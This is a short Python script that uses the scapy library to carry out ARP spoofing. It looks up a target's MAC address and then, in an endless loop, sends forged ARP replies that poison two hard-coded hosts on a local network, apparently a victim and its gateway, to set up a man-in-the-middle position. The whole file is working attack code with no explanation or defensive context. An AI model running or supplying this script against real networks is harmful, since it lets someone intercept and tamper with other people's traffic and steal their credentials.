import time

import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    broadcast_arp_request = broadcast/arp_request
    answered = scapy.srp(broadcast_arp_request, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


count = 0
while True:
    spoof('192.168.160.149', '192.168.160.2')
    spoof('192.168.160.2', '192.168.160.149')
    count = count + 2
    print(f'\r[+] Packets sent: {count}', end='')
    time.sleep(2)
